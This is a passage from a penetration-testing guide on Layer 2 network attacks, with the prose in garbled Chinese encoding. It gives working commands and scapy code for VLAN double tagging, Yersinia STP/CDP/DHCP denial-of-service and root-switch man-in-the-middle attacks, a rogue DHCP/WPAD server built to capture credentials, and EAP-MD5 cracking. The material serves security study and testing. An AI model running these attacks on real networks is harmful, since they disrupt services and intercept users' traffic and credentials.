root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

è®¨è®ºçš„æ”»å‡» **åŠ¨æ€å¹²çº¿å’Œåˆ›å»ºè™šæ‹Ÿæ¥å£ä»¥å‘ç°å…¶ä»– VLAN ä¸­çš„ä¸»æœº** æ˜¯ **ç”±å·¥å…·è‡ªåŠ¨æ‰§è¡Œçš„**: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

å¦‚æœæ”»å‡»è€…çŸ¥é“ **å—å®³ä¸»æœºçš„ MACã€IP å’Œ VLAN ID çš„å€¼**ï¼Œä»–å¯ä»¥å°è¯• **åŒé‡æ ‡è®°ä¸€ä¸ªå¸§**ï¼Œä½¿ç”¨å…¶æŒ‡å®šçš„ VLAN å’Œå—å®³è€…çš„ VLAN å¹¶å‘é€ä¸€ä¸ªæ•°æ®åŒ…ã€‚ç”±äº **å—å®³è€…æ— æ³•ä¸æ”»å‡»è€…è¿æ¥**ï¼Œå› æ­¤ **æ”»å‡»è€…çš„æœ€ä½³é€‰æ‹©æ˜¯é€šè¿‡ UDP è¿›è¡Œé€šä¿¡**ï¼Œä¸å¯ä»¥æ‰§è¡Œä¸€äº›æœ‰è¶£æ“ä½œçš„åè®®ï¼ˆå¦‚ SNMPï¼‰ã€‚

æ”»å‡»è€…çš„å¦ä¸€ä¸ªé€‰æ‹©æ˜¯å‘èµ· **TCP ç«¯å£æ‰«æï¼Œä¼ªè£…æˆä¸€ä¸ªç”±æ”»å‡»è€…æ§åˆ¶å¹¶ä¸”å—å®³è€…å¯ä»¥è®¿é—®çš„ IP**ï¼ˆå¯èƒ½é€šè¿‡äº’è”ç½‘ï¼‰ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä»–æ‹¥æœ‰çš„ç¬¬äºŒä¸ªä¸»æœºä¸Šå—…æ¢ï¼Œå¦‚æœå®ƒæ¥æ”¶åˆ°æ¥è‡ªå—å®³è€…çš„ä¸€äº›æ•°æ®åŒ…ã€‚

![](<../../.gitbook/assets/image (190).png>)

è¦æ‰§è¡Œæ­¤æ”»å‡»ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

å¦‚æœæ‚¨**å¯ä»¥è®¿é—®ç›´æ¥è¿æ¥çš„äº¤æ¢æœº**ï¼Œæ‚¨å°±æœ‰èƒ½åŠ›**ç»•è¿‡ VLAN åˆ†æ®µ**ã€‚åªéœ€**å°†ç«¯å£åˆ‡æ¢åˆ°å¹²é“æ¨¡å¼**ï¼ˆä¹Ÿç§°ä¸ºå¹²é“ï¼‰ï¼Œåˆ›å»ºå…·æœ‰ç›®æ ‡ VLAN ID çš„è™šæ‹Ÿæ¥å£ï¼Œå¹¶é…ç½® IP åœ°å€ã€‚æ‚¨å¯ä»¥å°è¯•åŠ¨æ€è¯·æ±‚åœ°å€ï¼ˆDHCPï¼‰ï¼Œæˆ–è€…å¯ä»¥é™æ€é…ç½®ã€‚å…·ä½“å–å†³äºæƒ…å†µã€‚

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Layer 3 Private VLAN Bypass

åœ¨æŸäº›ç¯å¢ƒä¸­ï¼Œä¾‹å¦‚è®¿å®¢æ— çº¿ç½‘ç»œï¼Œ**ç«¯å£éš”ç¦»ï¼ˆä¹Ÿç§°ä¸ºç§æœ‰ VLANï¼‰**è®¾ç½®è¢«å®æ–½ï¼Œä»¥é˜²æ­¢è¿æ¥åˆ°æ— çº¿æ¥å…¥ç‚¹çš„å®¢æˆ·ç«¯ç›´æ¥ç›¸äº’é€šä¿¡ã€‚ç„¶è€Œï¼Œå·²ç»è¯†åˆ«å‡ºä¸€ç§å¯ä»¥è§„é¿è¿™äº›éš”ç¦»æªæ–½çš„æŠ€æœ¯ã€‚è¯¥æŠ€æœ¯åˆ©ç”¨ç½‘ç»œ ACL çš„ç¼ºå¤±æˆ–é…ç½®ä¸å½“ï¼Œä½¿å¾— IP æ•°æ®åŒ…èƒ½å¤Ÿé€šè¿‡è·¯ç”±å™¨è·¯ç”±åˆ°åŒä¸€ç½‘ç»œä¸Šçš„å¦ä¸€ä¸ªå®¢æˆ·ç«¯ã€‚

æ”»å‡»æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ª**æºå¸¦ç›®æ ‡å®¢æˆ·ç«¯ IP åœ°å€ä½†å¸¦æœ‰è·¯ç”±å™¨ MAC åœ°å€çš„åŒ…**æ¥æ‰§è¡Œçš„ã€‚è¿™å¯¼è‡´è·¯ç”±å™¨é”™è¯¯åœ°å°†æ•°æ®åŒ…è½¬å‘ç»™ç›®æ ‡å®¢æˆ·ç«¯ã€‚è¿™ç§æ–¹æ³•ç±»ä¼¼äºåŒæ ‡è®°æ”»å‡»ä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼Œå…¶ä¸­åˆ©ç”¨å¯è®¿é—®å—å®³è€…çš„ä¸»æœºçš„èƒ½åŠ›æ¥åˆ©ç”¨å®‰å…¨æ¼æ´ã€‚

**æ”»å‡»çš„å…³é”®æ­¥éª¤ï¼š**

1. **æ„é€ æ•°æ®åŒ…ï¼š** ç‰¹åˆ«æ„é€ ä¸€ä¸ªæ•°æ®åŒ…ï¼Œä»¥åŒ…å«ç›®æ ‡å®¢æˆ·ç«¯çš„ IP åœ°å€ï¼Œä½†å¸¦æœ‰è·¯ç”±å™¨çš„ MAC åœ°å€ã€‚
2. **åˆ©ç”¨è·¯ç”±å™¨è¡Œä¸ºï¼š** å°†æ„é€ çš„æ•°æ®åŒ…å‘é€åˆ°è·¯ç”±å™¨ï¼Œç”±äºé…ç½®åŸå› ï¼Œè·¯ç”±å™¨å°†æ•°æ®åŒ…é‡å®šå‘åˆ°ç›®æ ‡å®¢æˆ·ç«¯ï¼Œç»•è¿‡ç§æœ‰ VLAN è®¾ç½®æä¾›çš„éš”ç¦»ã€‚

### VTP Attacks

VTPï¼ˆVLAN Trunking Protocolï¼‰é›†ä¸­ç®¡ç† VLANã€‚å®ƒåˆ©ç”¨ä¿®è®¢å·æ¥ç»´æŠ¤ VLAN æ•°æ®åº“çš„å®Œæ•´æ€§ï¼›ä»»ä½•ä¿®æ”¹éƒ½ä¼šå¢åŠ æ­¤æ•°å­—ã€‚äº¤æ¢æœºé‡‡ç”¨å…·æœ‰æ›´é«˜ä¿®è®¢å·çš„é…ç½®ï¼Œæ›´æ–°è‡ªå·±çš„ VLAN æ•°æ®åº“ã€‚

#### VTP Domain Roles

* **VTP Server:** ç®¡ç† VLANâ€”â€”åˆ›å»ºã€åˆ é™¤ã€ä¿®æ”¹ã€‚å®ƒå‘åŸŸæˆå‘˜å¹¿æ’­ VTP é€šå‘Šã€‚
* **VTP Client:** æ¥æ”¶ VTP é€šå‘Šä»¥åŒæ­¥å…¶ VLAN æ•°æ®åº“ã€‚æ­¤è§’è‰²è¢«é™åˆ¶è¿›è¡Œæœ¬åœ° VLAN é…ç½®ä¿®æ”¹ã€‚
* **VTP Transparent:** ä¸å‚ä¸ VTP æ›´æ–°ï¼Œä½†è½¬å‘ VTP é€šå‘Šã€‚ä¸å— VTP æ”»å‡»å½±å“ï¼Œä¿æŒä¿®è®¢å·ä¸ºé›¶ã€‚

#### VTP Advertisement Types

* **Summary Advertisement:** æ¯ 300 ç§’ç”± VTP æœåŠ¡å™¨å¹¿æ’­ï¼Œæºå¸¦é‡è¦çš„åŸŸä¿¡æ¯ã€‚
* **Subset Advertisement:** åœ¨ VLAN é…ç½®æ›´æ”¹åå‘é€ã€‚
* **Advertisement Request:** ç”± VTP å®¢æˆ·ç«¯å‘å‡ºï¼Œè¯·æ±‚æ‘˜è¦é€šå‘Šï¼Œé€šå¸¸æ˜¯å“åº”æ£€æµ‹åˆ°æ›´é«˜çš„é…ç½®ä¿®è®¢å·ã€‚

VTP æ¼æ´ä»…é€šè¿‡å¹²é“ç«¯å£å¯è¢«åˆ©ç”¨ï¼Œå› ä¸º VTP é€šå‘Šä»…é€šè¿‡è¿™äº›ç«¯å£ä¼ æ’­ã€‚åœ¨ DTP æ”»å‡»åœºæ™¯ä¹‹åï¼Œå¯èƒ½ä¼šè½¬å‘ VTPã€‚åƒ Yersinia è¿™æ ·çš„å·¥å…·å¯ä»¥ä¿ƒè¿› VTP æ”»å‡»ï¼Œæ—¨åœ¨æ¸…é™¤ VLAN æ•°æ®åº“ï¼Œæœ‰æ•ˆåœ°ç ´åç½‘ç»œã€‚

æ³¨æ„ï¼šæœ¬è®¨è®ºæ¶‰åŠ VTP ç‰ˆæœ¬ 1ï¼ˆVTPv1ï¼‰ã€‚
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
åœ¨Yersiniaçš„å›¾å½¢æ¨¡å¼ä¸­ï¼Œé€‰æ‹©åˆ é™¤æ‰€æœ‰VTP VLANé€‰é¡¹ä»¥æ¸…é™¤VLANæ•°æ®åº“ã€‚

### STPæ”»å‡»

**å¦‚æœæ‚¨æ— æ³•åœ¨æ¥å£ä¸Šæ•è·BPDUå¸§ï¼Œé‚£ä¹ˆæ‚¨åœ¨STPæ”»å‡»ä¸­æˆåŠŸçš„å¯èƒ½æ€§ä¸å¤§ã€‚**

#### **STP BPDU DoS**

å‘é€å¤§é‡çš„BPDUs TCPï¼ˆæ‹“æ‰‘å˜åŒ–é€šçŸ¥ï¼‰æˆ–Confï¼ˆåœ¨åˆ›å»ºæ‹“æ‰‘æ—¶å‘é€çš„BPDUsï¼‰ï¼Œäº¤æ¢æœºä¼šè¿‡è½½å¹¶åœæ­¢æ­£å¸¸å·¥ä½œã€‚
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCPæ”»å‡»**

å½“å‘é€TCPæ—¶ï¼Œäº¤æ¢æœºçš„CAMè¡¨å°†åœ¨15ç§’å†…è¢«åˆ é™¤ã€‚ç„¶åï¼Œå¦‚æœæ‚¨æŒç»­å‘é€è¿™ç§æ•°æ®åŒ…ï¼ŒCAMè¡¨å°†ä¸æ–­é‡å¯ï¼ˆæˆ–æ¯15ç§’é‡å¯ä¸€æ¬¡ï¼‰ï¼Œå½“å®ƒé‡å¯æ—¶ï¼Œäº¤æ¢æœºçš„è¡Œä¸ºå°±åƒä¸€ä¸ªé›†çº¿å™¨ã€‚
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

æ”»å‡»è€…æ¨¡æ‹Ÿäº¤æ¢æœºçš„è¡Œä¸ºï¼Œä»¥æˆä¸ºç½‘ç»œçš„ STP æ ¹ã€‚ç„¶åï¼Œæ›´å¤šçš„æ•°æ®å°†é€šè¿‡ä»–ä¼ è¾“ã€‚å½“ä½ è¿æ¥åˆ°ä¸¤ä¸ªä¸åŒçš„äº¤æ¢æœºæ—¶ï¼Œè¿™å¾ˆæœ‰è¶£ã€‚\
è¿™æ˜¯é€šè¿‡å‘é€ BPDUs CONF æ•°æ®åŒ…æ¥å®Œæˆçš„ï¼Œå£°ç§° **ä¼˜å…ˆçº§** å€¼ä½äºå®é™…æ ¹äº¤æ¢æœºçš„å®é™…ä¼˜å…ˆçº§ã€‚
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**å¦‚æœæ”»å‡»è€…è¿æ¥åˆ°ä¸¤ä¸ªäº¤æ¢æœºï¼Œä»–å¯ä»¥æˆä¸ºæ–°æ ‘çš„æ ¹ï¼Œæ‰€æœ‰åœ¨è¿™äº›äº¤æ¢æœºä¹‹é—´çš„æµé‡å°†é€šè¿‡ä»–**ï¼ˆå°†æ‰§è¡ŒMITMæ”»å‡»ï¼‰ã€‚
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP æ”»å‡»

CISCO å‘ç°åè®® (CDP) å¯¹äº CISCO è®¾å¤‡ä¹‹é—´çš„é€šä¿¡è‡³å…³é‡è¦ï¼Œä½¿å®ƒä»¬èƒ½å¤Ÿ **ç›¸äº’è¯†åˆ«å¹¶å…±äº«é…ç½®ç»†èŠ‚**ã€‚

#### è¢«åŠ¨æ•°æ®æ”¶é›† <a href="#id-0e0f" id="id-0e0f"></a>

CDP è¢«é…ç½®ä¸ºé€šè¿‡æ‰€æœ‰ç«¯å£å¹¿æ’­ä¿¡æ¯ï¼Œè¿™å¯èƒ½å¯¼è‡´å®‰å…¨é£é™©ã€‚æ”»å‡»è€…åœ¨è¿æ¥åˆ°äº¤æ¢æœºç«¯å£æ—¶ï¼Œå¯ä»¥éƒ¨ç½²ç½‘ç»œå—…æ¢å™¨ï¼Œå¦‚ **Wireshark**ã€**tcpdump** æˆ– **Yersinia**ã€‚æ­¤æ“ä½œå¯ä»¥æ­ç¤ºæœ‰å…³ç½‘ç»œè®¾å¤‡çš„æ•æ„Ÿæ•°æ®ï¼ŒåŒ…æ‹¬å…¶å‹å·å’Œè¿è¡Œçš„ Cisco IOS ç‰ˆæœ¬ã€‚æ”»å‡»è€…å¯èƒ½ä¼šé’ˆå¯¹è¯†åˆ«å‡ºçš„ Cisco IOS ç‰ˆæœ¬ä¸­çš„ç‰¹å®šæ¼æ´ã€‚

#### å¼•å‘ CDP è¡¨æ³›æ´ª <a href="#id-0d6a" id="id-0d6a"></a>

ä¸€ç§æ›´æ¿€è¿›çš„æ–¹æ³•æ˜¯é€šè¿‡å‡è£…æ˜¯åˆæ³•çš„ CISCO è®¾å¤‡æ¥å‘èµ·æ‹’ç»æœåŠ¡ (DoS) æ”»å‡»ï¼Œä»è€Œå‹å€’äº¤æ¢æœºçš„å†…å­˜ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨ Yersinia è¿™ä¸€ç½‘ç»œå·¥å…·å‘èµ·æ­¤ç±»æ”»å‡»çš„å‘½ä»¤åºåˆ—ï¼š
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
åœ¨æ­¤æ”»å‡»ä¸­ï¼Œäº¤æ¢æœºçš„CPUå’ŒCDPé‚»å±…è¡¨è´Ÿæ‹…æ²‰é‡ï¼Œå¯¼è‡´é€šå¸¸æ‰€ç§°çš„**â€œç½‘ç»œç˜«ç—ªâ€**ï¼Œè¿™æ˜¯ç”±äºè¿‡åº¦çš„èµ„æºæ¶ˆè€—ã€‚

#### CDPå†’å……æ”»å‡»
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ [**scapy**](https://github.com/secdev/scapy/)ã€‚ç¡®ä¿ä½¿ç”¨ `scapy/contrib` åŒ…è¿›è¡Œå®‰è£…ã€‚

### VoIPæ”»å‡»å’ŒVoIP Hopperå·¥å…·

VoIPç”µè¯ï¼Œè¶Šæ¥è¶Šå¤šåœ°ä¸ç‰©è”ç½‘è®¾å¤‡é›†æˆï¼Œæä¾›é€šè¿‡ç‰¹æ®Šç”µè¯å·ç è§£é”é—¨æˆ–æ§åˆ¶æ’æ¸©å™¨ç­‰åŠŸèƒ½ã€‚ç„¶è€Œï¼Œè¿™ç§é›†æˆå¯èƒ½ä¼šå¸¦æ¥å®‰å…¨é£é™©ã€‚

å·¥å…· [**voiphopper**](http://voiphopper.sourceforge.net) æ—¨åœ¨åœ¨å„ç§ç¯å¢ƒä¸­æ¨¡æ‹ŸVoIPç”µè¯ï¼ˆCiscoã€Avayaã€Nortelã€Alcatel-Lucentï¼‰ã€‚å®ƒä½¿ç”¨CDPã€DHCPã€LLDP-MEDå’Œ802.1Q ARPç­‰åè®®å‘ç°è¯­éŸ³ç½‘ç»œçš„VLAN IDã€‚

**VoIP Hopper** ä¸ºCiscoå‘ç°åè®®ï¼ˆCDPï¼‰æä¾›ä¸‰ç§æ¨¡å¼ï¼š

1. **å—…æ¢æ¨¡å¼** (`-c 0`): åˆ†æç½‘ç»œæ•°æ®åŒ…ä»¥è¯†åˆ«VLAN IDã€‚
2. **æ¬ºéª—æ¨¡å¼** (`-c 1`): ç”Ÿæˆè‡ªå®šä¹‰æ•°æ®åŒ…ï¼Œæ¨¡ä»¿å®é™…VoIPè®¾å¤‡çš„æ•°æ®åŒ…ã€‚
3. **ä½¿ç”¨é¢„åˆ¶æ•°æ®åŒ…çš„æ¬ºéª—æ¨¡å¼** (`-c 2`): å‘é€ä¸ç‰¹å®šCisco IPç”µè¯å‹å·ç›¸åŒçš„æ•°æ®åŒ…ã€‚

é€Ÿåº¦ä¼˜å…ˆçš„æ¨¡å¼æ˜¯ç¬¬ä¸‰ç§ã€‚å®ƒéœ€è¦æŒ‡å®šï¼š

* æ”»å‡»è€…çš„ç½‘ç»œæ¥å£ï¼ˆ`-i` å‚æ•°ï¼‰ã€‚
* è¢«æ¨¡æ‹Ÿçš„VoIPè®¾å¤‡çš„åç§°ï¼ˆ`-E` å‚æ•°ï¼‰ï¼Œéµå¾ªCiscoå‘½åæ ¼å¼ï¼ˆä¾‹å¦‚ï¼ŒSEPåè·ŸMACåœ°å€ï¼‰ã€‚

åœ¨ä¼ä¸šç¯å¢ƒä¸­ï¼Œä¸ºäº†æ¨¡ä»¿ç°æœ‰çš„VoIPè®¾å¤‡ï¼Œå¯ä»¥ï¼š

* æ£€æŸ¥ç”µè¯ä¸Šçš„MACæ ‡ç­¾ã€‚
* æµè§ˆç”µè¯çš„æ˜¾ç¤ºè®¾ç½®ä»¥æŸ¥çœ‹å‹å·ä¿¡æ¯ã€‚
* å°†VoIPè®¾å¤‡è¿æ¥åˆ°ç¬”è®°æœ¬ç”µè„‘ï¼Œå¹¶ä½¿ç”¨Wiresharkè§‚å¯ŸCDPè¯·æ±‚ã€‚

åœ¨ç¬¬ä¸‰ç§æ¨¡å¼ä¸‹æ‰§è¡Œå·¥å…·çš„ç¤ºä¾‹å‘½ä»¤ä¸ºï¼š
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP æ”»å‡»

#### æšä¸¾
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**å¯¹DHCPæœåŠ¡å™¨å¯ä»¥æ‰§è¡Œä¸¤ç§ç±»å‹çš„DoS**ã€‚ç¬¬ä¸€ç§æ˜¯**æ¨¡æ‹Ÿè¶³å¤Ÿå¤šçš„è™šå‡ä¸»æœºä»¥ä½¿ç”¨æ‰€æœ‰å¯èƒ½çš„IPåœ°å€**ã€‚\
æ­¤æ”»å‡»ä»…åœ¨æ‚¨å¯ä»¥çœ‹åˆ°DHCPæœåŠ¡å™¨çš„å“åº”å¹¶å®Œæˆåè®®æ—¶æœ‰æ•ˆï¼ˆ**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)ï¼‰ã€‚ä¾‹å¦‚ï¼Œè¿™åœ¨**Wifiç½‘ç»œä¸­æ˜¯ä¸å¯èƒ½çš„**ã€‚

æ‰§è¡ŒDHCP DoSçš„å¦ä¸€ç§æ–¹æ³•æ˜¯å‘é€**DHCP-RELEASEæ•°æ®åŒ…ï¼Œæºä»£ç ä½¿ç”¨æ¯ä¸ªå¯èƒ½çš„IP**ã€‚ç„¶åï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸ºæ¯ä¸ªäººéƒ½å·²ç»å®Œæˆäº†å¯¹è¯¥IPçš„ä½¿ç”¨ã€‚
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
ä¸€ä¸ªæ›´è‡ªåŠ¨åŒ–çš„æ–¹æ³•æ˜¯ä½¿ç”¨å·¥å…· [DHCPing](https://github.com/kamorin/DHCPig)

æ‚¨å¯ä»¥ä½¿ç”¨æåˆ°çš„ DoS æ”»å‡»æ¥å¼ºåˆ¶å®¢æˆ·ç«¯åœ¨ç¯å¢ƒä¸­è·å–æ–°ç§Ÿçº¦ï¼Œå¹¶è€—å°½åˆæ³•æœåŠ¡å™¨ï¼Œä½¿å…¶å˜å¾—æ— å“åº”ã€‚å› æ­¤ï¼Œå½“åˆæ³•æœåŠ¡å™¨å°è¯•é‡æ–°è¿æ¥æ—¶ï¼Œ**æ‚¨å¯ä»¥æä¾›ä¸‹ä¸€ä¸ªæ”»å‡»ä¸­æåˆ°çš„æ¶æ„å€¼**ã€‚

#### è®¾ç½®æ¶æ„å€¼

å¯ä»¥ä½¿ç”¨ä½äº `/usr/share/responder/DHCP.py` çš„ DHCP è„šæœ¬è®¾ç½®ä¸€ä¸ªæµæ°“ DHCP æœåŠ¡å™¨ã€‚è¿™å¯¹äºç½‘ç»œæ”»å‡»éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚é€šè¿‡å°†æµé‡é‡å®šå‘åˆ°æ¶æ„æœåŠ¡å™¨æ¥æ•è· HTTP æµé‡å’Œå‡­æ®ã€‚ç„¶è€Œï¼Œè®¾ç½®æµæ°“ç½‘å…³çš„æ•ˆæœè¾ƒå·®ï¼Œå› ä¸ºå®ƒä»…å…è®¸æ•è·å®¢æˆ·ç«¯çš„å‡ºç«™æµé‡ï¼Œé”™è¿‡æ¥è‡ªçœŸå®ç½‘å…³çš„å“åº”ã€‚ç›¸åï¼Œå»ºè®®è®¾ç½®æµæ°“ DNS æˆ– WPAD æœåŠ¡å™¨ä»¥è¿›è¡Œæ›´æœ‰æ•ˆçš„æ”»å‡»ã€‚

ä»¥ä¸‹æ˜¯é…ç½®æµæ°“ DHCP æœåŠ¡å™¨çš„å‘½ä»¤é€‰é¡¹ï¼š

* **æˆ‘ä»¬çš„ IP åœ°å€ï¼ˆç½‘å…³å¹¿å‘Šï¼‰**ï¼šä½¿ç”¨ `-i 10.0.0.100` å°†æ‚¨çš„æœºå™¨ IP å¹¿å‘Šä¸ºç½‘å…³ã€‚
* **æœ¬åœ° DNS åŸŸå**ï¼šå¯é€‰åœ°ï¼Œä½¿ç”¨ `-d example.org` è®¾ç½®æœ¬åœ° DNS åŸŸåã€‚
* **åŸå§‹è·¯ç”±å™¨/ç½‘å…³ IP**ï¼šä½¿ç”¨ `-r 10.0.0.1` æŒ‡å®šåˆæ³•è·¯ç”±å™¨æˆ–ç½‘å…³çš„ IP åœ°å€ã€‚
* **ä¸» DNS æœåŠ¡å™¨ IP**ï¼šä½¿ç”¨ `-p 10.0.0.100` è®¾ç½®æ‚¨æ§åˆ¶çš„æµæ°“ DNS æœåŠ¡å™¨çš„ IP åœ°å€ã€‚
* **æ¬¡çº§ DNS æœåŠ¡å™¨ IP**ï¼šå¯é€‰åœ°ï¼Œä½¿ç”¨ `-s 10.0.0.1` è®¾ç½®æ¬¡çº§ DNS æœåŠ¡å™¨ IPã€‚
* **æœ¬åœ°ç½‘ç»œçš„å­ç½‘æ©ç **ï¼šä½¿ç”¨ `-n 255.255.255.0` å®šä¹‰æœ¬åœ°ç½‘ç»œçš„å­ç½‘æ©ç ã€‚
* **DHCP æµé‡çš„æ¥å£**ï¼šä½¿ç”¨ `-I eth1` åœ¨ç‰¹å®šç½‘ç»œæ¥å£ä¸Šç›‘å¬ DHCP æµé‡ã€‚
* **WPAD é…ç½®åœ°å€**ï¼šä½¿ç”¨ `-w â€œhttp://10.0.0.100/wpad.datâ€` è®¾ç½® WPAD é…ç½®çš„åœ°å€ï¼Œä»¥ååŠ©ç½‘ç»œæµé‡æ‹¦æˆªã€‚
* **ä¼ªé€ é»˜è®¤ç½‘å…³ IP**ï¼šåŒ…æ‹¬ `-S` ä»¥ä¼ªé€ é»˜è®¤ç½‘å…³ IP åœ°å€ã€‚
* **å“åº”æ‰€æœ‰ DHCP è¯·æ±‚**ï¼šåŒ…æ‹¬ `-R` ä½¿æœåŠ¡å™¨å“åº”æ‰€æœ‰ DHCP è¯·æ±‚ï¼Œä½†è¦æ³¨æ„è¿™ä¼šäº§ç”Ÿå™ªéŸ³å¹¶å¯èƒ½è¢«æ£€æµ‹åˆ°ã€‚

é€šè¿‡æ­£ç¡®ä½¿ç”¨è¿™äº›é€‰é¡¹ï¼Œå¯ä»¥æœ‰æ•ˆåœ°å»ºç«‹ä¸€ä¸ªæµæ°“ DHCP æœåŠ¡å™¨ä»¥æ‹¦æˆªç½‘ç»œæµé‡ã€‚
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAPæ”»å‡»**

ä»¥ä¸‹æ˜¯å¯ä»¥é’ˆå¯¹802.1Xå®ç°ä½¿ç”¨çš„ä¸€äº›æ”»å‡»ç­–ç•¥ï¼š

* é€šè¿‡EAPè¿›è¡Œä¸»åŠ¨çš„æš´åŠ›ç ´è§£å¯†ç 
* ä½¿ç”¨ç•¸å½¢EAPå†…å®¹æ”»å‡»RADIUSæœåŠ¡å™¨ _\*\*_(åˆ©ç”¨)
* æ•è·EAPæ¶ˆæ¯å¹¶è¿›è¡Œç¦»çº¿å¯†ç ç ´è§£ï¼ˆEAP-MD5å’ŒPEAPï¼‰
* å¼ºåˆ¶EAP-MD5èº«ä»½éªŒè¯ä»¥ç»•è¿‡TLSè¯ä¹¦éªŒè¯
* åœ¨ä½¿ç”¨é›†çº¿å™¨æˆ–ç±»ä¼¼è®¾å¤‡è¿›è¡Œèº«ä»½éªŒè¯æ—¶æ³¨å…¥æ¶æ„ç½‘ç»œæµé‡

å¦‚æœæ”»å‡»è€…ä½äºå—å®³è€…ä¸èº«ä»½éªŒè¯æœåŠ¡å™¨ä¹‹é—´ï¼Œä»–å¯ä»¥å°è¯•é™çº§ï¼ˆå¦‚æœ‰å¿…è¦ï¼‰èº«ä»½éªŒè¯åè®®è‡³EAP-MD5å¹¶æ•è·èº«ä»½éªŒè¯å°è¯•ã€‚ç„¶åï¼Œä»–å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è¿›è¡Œæš´åŠ›ç ´è§£ï¼š
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) æ”»å‡» <a href="#id-6196" id="id-6196"></a>

**FHRP**ï¼ˆç¬¬ä¸€è·³å†—ä½™åè®®ï¼‰æ˜¯ä¸€ç±»æ—¨åœ¨**åˆ›å»ºçƒ­å†—ä½™è·¯ç”±ç³»ç»Ÿ**çš„ç½‘ç»œåè®®ã€‚é€šè¿‡FHRPï¼Œç‰©ç†è·¯ç”±å™¨å¯ä»¥ç»„åˆæˆä¸€ä¸ªå•ä¸€çš„é€»è¾‘è®¾å¤‡ï¼Œä»è€Œæé«˜å®¹é”™èƒ½åŠ›å¹¶å¸®åŠ©åˆ†é…è´Ÿè½½ã€‚

**æ€ç§‘ç³»ç»Ÿå·¥ç¨‹å¸ˆå¼€å‘äº†ä¸¤ç§FHRPåè®®ï¼ŒGLBPå’ŒHSRPã€‚**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

